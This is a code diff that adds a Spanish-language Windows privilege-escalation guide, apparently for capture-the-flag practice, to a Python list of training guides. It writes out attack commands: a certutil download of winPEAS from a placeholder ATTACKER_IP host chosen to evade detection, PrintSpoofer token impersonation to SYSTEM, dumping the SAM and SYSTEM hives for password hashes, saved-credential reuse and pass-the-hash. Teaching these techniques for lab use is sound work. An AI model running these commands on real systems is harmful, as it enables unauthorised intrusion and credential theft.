@@ -631,4 +631,98 @@ GUIDES = [
             },
         ],
     },
+    {
+        "id": "privesc-windows",
+        "title": "Escalar privilegios en Windows",
+        "phase": "privesc",
+        "section": "windows-privesc",
+        "summary": "De shell de usuario a SYSTEM/admin: contexto, enumeracion, vectores prioritarios y credenciales, en orden de rentabilidad.",
+        "steps": [
+            {
+                "title": "Contexto y privilegios",
+                "idea": "Antes de enumerar nada, orientate: quien eres, en que host estas, y sobre todo que privilegios de token tienes. En Windows, un solo privilegio habilitado (SeImpersonate, SeBackup) suele decidir todo el camino sin necesidad de buscar mas. Esto te dice si priorizar tokens, servicios, tareas o credenciales.",
+                "commands": [
+                    {
+                        "cmd": "whoami /all",
+                        "why": "Un solo comando que junta usuario, grupos y privilegios de token. Es el punto de partida obligado: casi todo lo demas depende de lo que veas aqui.",
+                        "out": "Tu usuario (a veces una cuenta de servicio tipo iis apppool). Grupos como Administrators o Backup Operators. Privilegios con State Enabled: SeImpersonate/SeAssignPrimaryToken, SeBackup/SeRestore, SeDebug.",
+                    },
+                    {
+                        "cmd": "systeminfo",
+                        "why": "Version, build y arquitectura de Windows. Te dice si un exploit de kernel podria aplicar mas adelante, y que binarios (32/64 bits) subir despues.",
+                        "out": "OS Version/Build y System Type (x64/x86). Guarda esto para comparar con CVEs si los vectores de config no dan nada.",
+                    },
+                ],
+                "look": "Privilegios de token con State: Enabled (no basta con que aparezcan listados, tienen que estar habilitados). Grupos privilegiados. Version exacta del sistema.",
+                "decide": "SeImpersonate/SeAssignPrimaryToken habilitado -> prioridad maxima, salta a family Potato. Sin privilegios especiales -> sigue con la enumeracion sistematica.",
+            },
+            {
+                "title": "Enumeracion rapida",
+                "idea": "Recorre servicios, tareas programadas y configuraciones en busca de permisos flojos o credenciales sueltas. Una herramienta automatizada como winPEAS ahorra tiempo y resalta lo probable, pero no sustituye entender que esta buscando cada check: los falsos positivos son comunes.",
+                "commands": [
+                    {
+                        "cmd": "certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe",
+                        "why": "Transfiere winPEAS a la victima usando una utilidad de Windows que casi nunca esta bloqueada (certutil no suele estar en listas de deteccion tan vigiladas como powershell -enc).",
+                        "out": "El binario en C:\\Windows\\Temp. Ejecutalo y guarda la salida (> winpeas.log) para no perder el scroll de la consola.",
+                    },
+                    {
+                        "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"",
+                        "why": "Lista servicios cuyo ejecutable NO esta en System32 (los de terceros son los candidatos reales a permisos flojos o rutas sin comillas).",
+                        "out": "Nombre, ruta y modo de arranque de cada servicio no estandar. Rutas con espacios y sin comillas, o en carpetas de terceros, son las que revisas primero.",
+                    },
+                ],
+                "look": "Servicios de terceros con rutas raras. Tareas programadas que ejecutan scripts en carpetas escribibles. Credenciales en ficheros de config o el historial de PowerShell.",
+                "decide": "winPEAS resalta algo en rojo/amarillo -> validalo contra el vector concreto antes de actuar. Nada destaca -> pasa a los vectores prioritarios manualmente.",
+            },
+            {
+                "title": "Vectores prioritarios",
+                "idea": "Con el contexto y la enumeracion hechos, ataca en orden de rentabilidad: primero el privilegio de token si lo tienes (es casi SYSTEM garantizado), despues servicios mal configurados y AlwaysInstallElevated, que son limpios y fiables cuando aplican.",
+                "commands": [
+                    {
+                        "cmd": "PrintSpoofer64.exe -i -c cmd",
+                        "why": "Si tienes SeImpersonate, este es el camino mas directo a SYSTEM: fuerza al spooler a autenticarse contra el exploit y suplanta su token.",
+                        "out": "Un cmd nuevo donde whoami dice 'nt authority\\system'. Si falla, prueba GodPotato o JuicyPotato segun la version exacta de Windows.",
+                    },
+                    {
+                        "cmd": "sc qc <servicio> && icacls \"C:\\ruta\\al\\servicio.exe\"",
+                        "why": "Comprueba de un vistazo la ruta/cuenta del servicio (sc qc) y quien puede escribir su ejecutable (icacls). Ambos datos juntos te dicen si el servicio es explotable.",
+                        "out": "BINARY_PATH_NAME y SERVICE_START_NAME (LocalSystem = objetivo jugoso). En icacls, un (F) o (M) para tu usuario/grupo sobre el .exe confirma que puedes reemplazarlo.",
+                    },
+                ],
+                "look": "SeImpersonate habilitado. Servicios con SERVICE_CHANGE_CONFIG o binario escribible. Rutas de servicio sin comillas con directorio intermedio escribible. AlwaysInstallElevated a 1 en HKCU y HKLM.",
+                "decide": "Cualquiera de estos confirmado -> explotalo, es limpio y fiable. Ninguno aplica -> pasa a credenciales y privilegios especiales.",
+            },
+            {
+                "title": "Credenciales y privilegios especiales",
+                "idea": "Si los vectores de configuracion no dieron nada, busca credenciales guardadas por el propio Windows: gestor de credenciales, historial de PowerShell, ficheros de despliegue. Si tienes SeBackup/SeRestore, saltas directo a volcar el SAM sin depender de encontrar nada a mano.",
+                "commands": [
+                    {
+                        "cmd": "cmdkey /list",
+                        "why": "Lista credenciales guardadas por Windows Credential Manager. Si hay alguna con /savecred, puedes reutilizarla con runas sin conocer la password.",
+                        "out": "Target y usuario de cada credencial guardada. Combina con runas /savecred /user:<usuario> cmd para reutilizarla sin verla en claro.",
+                    },
+                    {
+                        "cmd": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
+                        "why": "Si whoami /all mostro SeBackupPrivilege, esto salta el bloqueo normal del SAM y te lleva los hashes locales, incluido administrator, sin depender de encontrar nada mas.",
+                        "out": "Dos ficheros .hive. Bajalos a tu Kali y extrae los hashes con impacket-secretsdump -sam sam.hive -system system.hive LOCAL.",
+                    },
+                ],
+                "look": "Credenciales en cmdkey, PowerShell history (ConsoleHost_history.txt), Unattend.xml/sysprep, o hives SAM/SYSTEM volcables.",
+                "decide": "Credencial encontrada -> pruebala (reuse) o crackeala si es un hash. Hash NTLM de administrator -> Pass-the-Hash directo con evil-winrm -H.",
+            },
+            {
+                "title": "Confirmacion y cierre",
+                "idea": "Confirma que de verdad tienes SYSTEM o admin, no solo un privilegio a medio camino, y anota el vector exacto que funciono: te hace falta para el writeup y para reconocer el mismo patron en la siguiente room. Deja el kernel exploit y el bypass de UAC como plan B: son mas ruidosos e inestables que los vectores anteriores.",
+                "commands": [
+                    {
+                        "cmd": "whoami /priv",
+                        "why": "Confirmacion final: verifica que corres como nt authority\\system (o que tu usuario ya esta en el grupo Administrators con integridad High) antes de dar la escalada por cerrada.",
+                        "out": "El usuario activo debe ser nt authority\\system, o tu whoami /groups debe mostrar integridad High si elevaste via administrator.",
+                    },
+                ],
+                "look": "Confirmacion clara de SYSTEM o admin con integridad alta, no solo pertenecer al grupo Administrators con integridad Medium (eso todavia necesitaria un bypass de UAC).",
+                "decide": "SYSTEM confirmado -> recoge la flag y documenta el vector exacto (que privilegio/servicio/credencial lo permitio). Sigues en Medium/usuario normal -> vuelve a los vectores prioritarios antes de recurrir a un exploit de kernel.",
+            },
+        ],
+    },
 ]
